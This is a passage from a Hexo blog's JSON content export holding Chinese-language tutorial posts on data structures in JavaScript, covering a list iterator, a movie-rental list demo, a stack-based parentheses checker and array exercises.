class=\"built_in\">console</span>.log(<span class=\"string\">\"1使用迭代器访问列表+++++++++++++++++\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (names.front(); names.hasNext(); names.next()) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(names.getElement());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// jovy</span></span><br><span class=\"line\"><span class=\"comment\">// sun</span></span><br><span class=\"line\"><span class=\"comment\">// tom</span></span><br><span class=\"line\"><span class=\"comment\">// lucy</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"2使用迭代器访问列表+++++++++++++++++\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (names.end(); names.hasPrev(); names.prev()) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(names.getElement());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// lucy</span></span><br><span class=\"line\"><span class=\"comment\">// tom</span></span><br><span class=\"line\"><span class=\"comment\">// sun</span></span><br><span class=\"line\"><span class=\"comment\">// jovy</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"一个基于列表的应用\"><a href=\"#一个基于列表的应用\" class=\"headerlink\" title=\"一个基于列表的应用\"></a>一个基于列表的应用</h2><p>模拟影碟租赁自助查询系统：查询可租借清单，查询用户租赁清单，用户租赁。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义客户类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Customer</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(name, movie) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.movie = movie;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 显示清单</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">displayList</span>(<span class=\"params\">list</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (list.front(); list.hasNext(); list.next()) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (list.getElement() <span class=\"keyword\">instanceof</span> Customer) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">        list.getElement()[<span class=\"string\">\"name\"</span>] + <span class=\"string\">\", \"</span> + list.getElement()[<span class=\"string\">\"movie\"</span>]</span><br><span class=\"line\">      );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(list.getElement());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 检出电影</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkOut</span>(<span class=\"params\">name, movie, movieList, customerList</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (movieList.contains(movie)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> c = <span class=\"keyword\">new</span> Customer(name, movie);</span><br><span class=\"line\">    customerList.append(c);</span><br><span class=\"line\">    movieList.remove(movie);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(movie + <span class=\"string\">\" is not available.\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试+++++++++++++++++++++++++++++++</span></span><br><span class=\"line\"><span class=\"comment\">// 模拟读取数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> moviesStr =</span><br><span class=\"line\">  <span class=\"string\">\"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> movies = moviesStr.split(<span class=\"string\">\"，\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用列表管理电影数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> movieList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">movies.forEach(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">  movieList.append(element);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 使用列表管理客户数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> customerList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"Available movies: \\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br><span class=\"line\">checkOut(<span class=\"string\">\"Jovysun\"</span>, <span class=\"string\">\"教父\"</span>, movieList, customerList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCustomer Rentals: \\n\"</span>);</span><br><span class=\"line\">displayList(customerList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nMovies Now Available\\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br></pre></td></tr></table></figure>\n<h2 id=\"练习\"><a href=\"#练习\" class=\"headerlink\" title=\"练习\"></a>练习</h2><p>更多练习及实现答案请参考下一篇<a href=\"/2019/04/29/data-structures-list-2\">数据结构——列表(练习题及实现)</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》</p>"},{"title":"数据结构与算法@括号匹配","date":"2019-05-18T07:06:08.000Z","updated":"2019-05-18T07:06:08.000Z","_content":"\n# 概述\n\n写一个函数判断给定算术表达式中的括号是否匹配，例如`1/2+(3+4`是不匹配。\n\n<!-- more -->\n\n# 详述\n\n```js\n// 判断一个算术表达式中的括号是否匹配;\nfunction parenthesesChecker(symbols) {\n  const stack = new Stack();\n  const opens = \"([{\";\n  const closers = \")]}\";\n  let balanced = true;\n  let index = 0;\n  let symbol;\n  let top;\n\n  while (index < symbols.length && balanced) {\n    symbol = symbols[index];\n    if (opens.indexOf(symbol) >= 0) {\n      stack.push(symbol);\n    } else if (stack.isEmpty()) {\n      balanced = false;\n    } else {\n      top = stack.pop();\n      if (!(opens.indexOf(top) === closers.indexOf(symbol))) {\n        balanced = false;\n      }\n    }\n    index++;\n  }\n  return balanced && stack.isEmpty();\n}\n\nconsole.log(\"{([])}\", parenthesesChecker(\"{([])}\")); // true\nconsole.log(\"{{([][])}()}\", parenthesesChecker(\"{{([][])}()}\")); // true\nconsole.log(\"[{()]\", parenthesesChecker(\"[{()]\")); // false\n```\n\n# 参考\n","source":"_posts/2019/05/数据结构与算法-括号匹配.md","raw":"---\ntitle: 数据结构与算法@括号匹配\npermalink: 数据结构与算法@括号匹配\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-18 15:06:08\nupdated: 2019-05-18 15:06:08\n---\n\n# 概述\n\n写一个函数判断给定算术表达式中的括号是否匹配，例如`1/2+(3+4`是不匹配。\n\n<!-- more -->\n\n# 详述\n\n```js\n// 判断一个算术表达式中的括号是否匹配;\nfunction parenthesesChecker(symbols) {\n  const stack = new Stack();\n  const opens = \"([{\";\n  const closers = \")]}\";\n  let balanced = true;\n  let index = 0;\n  let symbol;\n  let top;\n\n  while (index < symbols.length && balanced) {\n    symbol = symbols[index];\n    if (opens.indexOf(symbol) >= 0) {\n      stack.push(symbol);\n    } else if (stack.isEmpty()) {\n      balanced = false;\n    } else {\n      top = stack.pop();\n      if (!(opens.indexOf(top) === closers.indexOf(symbol))) {\n        balanced = false;\n      }\n    }\n    index++;\n  }\n  return balanced && stack.isEmpty();\n}\n\nconsole.log(\"{([])}\", parenthesesChecker(\"{([])}\")); // true\nconsole.log(\"{{([][])}()}\", parenthesesChecker(\"{{([][])}()}\")); // true\nconsole.log(\"[{()]\", parenthesesChecker(\"[{()]\")); // false\n```\n\n# 参考\n","slug":"数据结构与算法@括号匹配","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xy007jwovv34llsxj7","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>写一个函数判断给定算术表达式中的括号是否匹配，例如<code>1/2+(3+4</code>是不匹配。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 判断一个算术表达式中的括号是否匹配;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">parenthesesChecker</span>(<span class=\"params\">symbols</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> stack = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">const</span> opens = <span class=\"string\">\"([&#123;\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> closers = <span class=\"string\">\")]&#125;\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> balanced = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> symbol;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> top;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (index &lt; symbols.length &amp;&amp; balanced) &#123;</span><br><span class=\"line\">    symbol = symbols[index];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (opens.indexOf(symbol) &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      stack.push(symbol);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (stack.isEmpty()) &#123;</span><br><span class=\"line\">      balanced = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      top = stack.pop();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!(opens.indexOf(top) === closers.indexOf(symbol))) &#123;</span><br><span class=\"line\">        balanced = <span class=\"literal\">false</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    index++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> balanced &amp;&amp; stack.isEmpty();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"&#123;([])&#125;\"</span>, parenthesesChecker(<span class=\"string\">\"&#123;([])&#125;\"</span>)); <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"&#123;&#123;([][])&#125;()&#125;\"</span>, parenthesesChecker(<span class=\"string\">\"&#123;&#123;([][])&#125;()&#125;\"</span>)); <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"[&#123;()]\"</span>, parenthesesChecker(<span class=\"string\">\"[&#123;()]\"</span>)); <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>写一个函数判断给定算术表达式中的括号是否匹配，例如<code>1/2+(3+4</code>是不匹配。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 判断一个算术表达式中的括号是否匹配;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">parenthesesChecker</span>(<span class=\"params\">symbols</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> stack = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">const</span> opens = <span class=\"string\">\"([&#123;\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> closers = <span class=\"string\">\")]&#125;\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> balanced = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> symbol;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> top;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (index &lt; symbols.length &amp;&amp; balanced) &#123;</span><br><span class=\"line\">    symbol = symbols[index];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (opens.indexOf(symbol) &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      stack.push(symbol);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (stack.isEmpty()) &#123;</span><br><span class=\"line\">      balanced = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      top = stack.pop();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!(opens.indexOf(top) === closers.indexOf(symbol))) &#123;</span><br><span class=\"line\">        balanced = <span class=\"literal\">false</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    index++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> balanced &amp;&amp; stack.isEmpty();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"&#123;([])&#125;\"</span>, parenthesesChecker(<span class=\"string\">\"&#123;([])&#125;\"</span>)); <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"&#123;&#123;([][])&#125;()&#125;\"</span>, parenthesesChecker(<span class=\"string\">\"&#123;&#123;([][])&#125;()&#125;\"</span>)); <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"[&#123;()]\"</span>, parenthesesChecker(<span class=\"string\">\"[&#123;()]\"</span>)); <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>"},{"title":"数据结构与算法@总览","date":"2019-05-17T03:03:20.000Z","updated":"2019-05-17T03:03:20.000Z","_content":"\n# 概述\n\n数据结构是解决以什么结构、层次、形式存储数据，算法是解决以什么方法去执行存储动作。我们要学的其实是前人经过实践总结、抽象出的一套高效的方法论。其实“条条道路通罗马”，我们需要掌握的是怎么分析出最近的“路”以及记住常见的“路”。\n\n最常用的数据结构与算法有：数组、链表、栈、队列、散列表、二叉树、堆、跳表、图、Trie 树；递归、排序、二分查找、搜索、哈希算法、贪心算法、分治算法、回溯算法、动态规划、字符串匹配算法。\n\n<!-- more -->\n\n# 详述\n\n![总览](overview.jpg)\n\n# 参考\n\n极客时间——数据结构与算法之美\n","source":"_posts/2019/05/数据结构与算法-总览.md","raw":"---\ntitle: 数据结构与算法@总览\npermalink: 数据结构与算法@总览\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-17 11:03:20\nupdated: 2019-05-17 11:03:20\n---\n\n# 概述\n\n数据结构是解决以什么结构、层次、形式存储数据，算法是解决以什么方法去执行存储动作。我们要学的其实是前人经过实践总结、抽象出的一套高效的方法论。其实“条条道路通罗马”，我们需要掌握的是怎么分析出最近的“路”以及记住常见的“路”。\n\n最常用的数据结构与算法有：数组、链表、栈、队列、散列表、二叉树、堆、跳表、图、Trie 树；递归、排序、二分查找、搜索、哈希算法、贪心算法、分治算法、回溯算法、动态规划、字符串匹配算法。\n\n<!-- more -->\n\n# 详述\n\n![总览](overview.jpg)\n\n# 参考\n\n极客时间——数据结构与算法之美\n","slug":"数据结构与算法@总览","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xz007nwovvfibpdd6q","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>数据结构是解决以什么结构、层次、形式存储数据，算法是解决以什么方法去执行存储动作。我们要学的其实是前人经过实践总结、抽象出的一套高效的方法论。其实“条条道路通罗马”，我们需要掌握的是怎么分析出最近的“路”以及记住常见的“路”。</p>\n<p>最常用的数据结构与算法有：数组、链表、栈、队列、散列表、二叉树、堆、跳表、图、Trie 树；递归、排序、二分查找、搜索、哈希算法、贪心算法、分治算法、回溯算法、动态规划、字符串匹配算法。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p><img src=\"/数据结构与算法@总览/overview.jpg\" alt=\"总览\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——数据结构与算法之美</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>数据结构是解决以什么结构、层次、形式存储数据，算法是解决以什么方法去执行存储动作。我们要学的其实是前人经过实践总结、抽象出的一套高效的方法论。其实“条条道路通罗马”，我们需要掌握的是怎么分析出最近的“路”以及记住常见的“路”。</p>\n<p>最常用的数据结构与算法有：数组、链表、栈、队列、散列表、二叉树、堆、跳表、图、Trie 树；递归、排序、二分查找、搜索、哈希算法、贪心算法、分治算法、回溯算法、动态规划、字符串匹配算法。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p><img src=\"/数据结构与算法@总览/overview.jpg\" alt=\"总览\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——数据结构与算法之美</p>"},{"title":"数据结构与算法@数组练习题","date":"2019-05-18T07:06:08.000Z","updated":"2019-05-18T07:06:08.000Z","_content":"\n# 概述\n\n数据结构数组相关练习题。\n\n<!-- more -->\n\n# 详述\n\n## 练习一\n\n创建一个记录学生成绩的对象，提供一个添加成绩的方法，以及一个现实学生平均成绩的方法。\n\n```js\nclass Grades {\n  constructor() {\n    this.dataStore = [];\n  }\n  add(gradeNum) {\n    if (typeof gradeNum !== \"number\") {\n      return;\n    }\n    this.dataStore.push(gradeNum);\n  }\n  average() {\n    if (this.dataStore.length === 0) {\n      return;\n    }\n    let totoal = this.dataStore.reduce((pre, cur) => {\n      return pre + cur;\n    });\n    return (totoal / this.dataStore.length).toFixed(2);\n  }\n}\n\nlet grades = new Grades();\ngrades.add(80);\ngrades.add(90);\ngrades.add(110);\nconsole.log(grades.average()); // 93.33\n```\n\n## 练习二\n\n将一组单词存储在一个数组中，并按正序和倒序分别显示这些单词。\n\n```js\nlet arr = [\"baidu\", \"ali\", \"tengxun\", \"jingdong\"];\nlet str = arr.sort().join(\",\");\nlet str2 = arr\n  .sort()\n  .reverse()\n  .join(\",\");\nconsole.log(str); // ali,baidu,jingdong,tengxun\nconsole.log(str2); // tengxun,jingdong,baidu,ali\n```\n\n## 练习三\n\n用一个二维数组存储每月的有用数据，增加一些方法显示月平均数，某一周平均数。\n\n```js\nclass MonthlyTemps {\n  constructor() {\n    this.dataStore = [];\n  }\n  add(weekIndex, temp) {\n    if (!this.dataStore[weekIndex]) {\n      this.dataStore.push([]);\n    }\n    this.dataStore[weekIndex].push(temp);\n  }\n  average(weekIndex) {\n    let total = 0,\n      count = 0;\n    if (typeof weekIndex !== \"undefined\") {\n      count = this.dataStore[weekIndex].length;\n      total = this.dataStore[weekIndex].reduce((pre, cur) => {\n        return pre + cur;\n      });\n      return (total / count).toFixed(2);\n    } else {\n      this.dataStore.forEach(ele => {\n        if (!Array.isArray(ele)) {\n          return;\n        }\n        count += ele.length;\n        let weekTotal = ele.reduce((pre, cur) => {\n          return pre + cur;\n        });\n        total += weekTotal;\n      });\n    }\n    return (total / count).toFixed(2);\n  }\n}\n\nlet monthlyTemps = new MonthlyTemps();\nmonthlyTemps.add(0, 52);\nmonthlyTemps.add(0, 55);\nmonthlyTemps.add(0, 61);\nmonthlyTemps.add(0, 65);\nmonthlyTemps.add(0, 50);\nmonthlyTemps.add(0, 57);\nmonthlyTemps.add(0, 59);\n\nmonthlyTemps.add(1, 54);\nmonthlyTemps.add(1, 55);\nmonthlyTemps.add(1, 61);\nmonthlyTemps.add(1, 65);\nmonthlyTemps.add(1, 50);\nmonthlyTemps.add(1, 57);\nmonthlyTemps.add(1, 59);\n\nconsole.log(monthlyTemps.average(0)); // 57.00\nconsole.log(monthlyTemps.average()); // 57.14\n```\n\n## 练习四\n\n创建这样一个对象，它将字符存储在一个数组中，并且用一个方法可以将字母连在一起，显示成一个单词。\n\n```js\nclass MyLetters {\n  constructor() {\n    this.dataStore = [];\n  }\n  add(letter) {\n    this.dataStore.push(letter);\n  }\n  word() {\n    return this.dataStore.join(\"\");\n  }\n}\n\nlet myLetters = new MyLetters();\nmyLetters.add(\"h\");\nmyLetters.add(\"i\");\nlet myword = myLetters.word();\nconsole.log(myword); // hi\n```\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n","source":"_posts/2019/05/数据结构与算法-数组练习题.md","raw":"---\ntitle: 数据结构与算法@数组练习题\npermalink: 数据结构与算法@数组练习题\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-18 15:06:08\nupdated: 2019-05-18 15:06:08\n---\n\n# 概述\n\n数据结构数组相关练习题。\n\n<!-- more -->\n\n# 详述\n\n## 练习一\n\n创建一个记录学生成绩的对象，提供一个添加成绩的方法，以及一个现实学生平均成绩的方法。\n\n```js\nclass Grades {\n  constructor() {\n    this.dataStore = [];\n  }\n  add(gradeNum) {\n    if (typeof gradeNum !== \"number\") {\n      return;\n    }\n    this.dataStore.push(gradeNum);\n  }\n  average() {\n    if (this.dataStore.length === 0) {\n      return;\n    }\n    let totoal = this.dataStore.reduce((pre, cur) => {\n      return pre + cur;\n    });\n    return (totoal / this.dataStore.length).toFixed(2);\n  }\n}\n\nlet grades = new Grades();\ngrades.add(80);\ngrades.add(90);\ngrades.add(110);\nconsole.log(grades.average()); // 93.33\n```\n\n## 练习二\n\n将一组单词存储在一个数组中，并按正序和倒序分别显示这些单词。\n\n```js\nlet arr = [\"baidu\", \"ali\", \"tengxun\", \"jingdong\"];\nlet str = arr.sort().join(\",\");\nlet str2 = arr\n  .sort()\n  .reverse()\n  .join(\",\");\nconsole.log(str); // ali,baidu,jingdong,tengxun\nconsole.log(str2); // tengxun,jingdong,baidu,ali\n```\n\n## 练习三\n\n用一个二维数组存储每月的有用数据，增加一些方法显示月平均数，某一周平均数。\n\n```js\nclass MonthlyTemps {\n  constructor() {\n    this.dataStore = [];\n  }\n  add(weekIndex, temp) {\n    if (!this.dataStore[weekIndex]) {\n      this.dataStore.push([]);\n    }\n    this.dataStore[weekIndex].push(temp);\n  }\n  average(weekIndex) {\n    let total = 0,\n      count = 0;\n    if (typeof weekIndex !== \"undefined\") {\n      count = this.dataStore[weekIndex].length;\n      total = this.dataStore[weekIndex].reduce((pre, cur) => {\n        return pre + cur;\n      });\n      return (total / count).toFixed(2);\n    } else {\n      this.dataStore.forEach(ele => {\n        if (!Array.isArray(ele)) {\n          return;\n        }\n        count += ele.length;\n        let weekTotal = ele.reduce((pre, cur) => {\n          return pre + cur;\n        });\n        total += weekTotal;\n      });\n    }\n    return (total / count).toFixed(2);\n  }\n}\n\nlet monthlyTemps = new MonthlyTemps();\nmonthlyTemps.add(0, 52);\nmonthlyTemps.add(0, 55);\nmonthlyTemps.add(0, 61);\nmonthlyTemps.add(0, 65);\nmonthlyTemps.add(0, 50);\nmonthlyTemps.add(0, 57);\nmonthlyTemps.add(0, 59);\n\nmonthlyTemps.add(1, 54);\nmonthlyTemps.add(1, 55);\nmonthlyTemps.add(1, 61);\nmonthlyTemps.add(1, 65);\nmonthlyTemps.add(1, 50);\nmonthlyTemps.add(1, 57);\nmonthlyTemps.add(1, 59);\n\nconsole.log(monthlyTemps.average(0)); // 57.00\nconsole.log(monthlyTemps.average()); // 57.14\n```\n\n## 练习四\n\n创建这样一个对象，它将字符存储在一个数组中，并且用一个方法可以将字母连在一起，显示成一个单词。\n\n```js\nclass MyLetters {\n  constructor() {\n    this.dataStore = [];\n  }\n  add(letter) {\n    this.dataStore.push(letter);\n  }\n  word() {\n    return this.dataStore.join(\"\");\n  }\n}\n\nlet myLetters = new MyLetters();\nmyLetters.add(\"h\");\nmyLetters.add(\"i\");\nlet myword = myLetters.word();\nconsole.log(myword); // hi\n```\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n","slug":"数据结构与算法@数组练习题","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8y0007qwovvieoq1rzc","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>数据结构数组相关练习题。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"练习一\"><a href=\"#练习一\" class=\"headerlink\" title=\"练习一\"></a>练习一</h2><p>创建一个记录学生成绩的对象，提供一个添加成绩的方法，以及一个现实学生平均成绩的方法。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 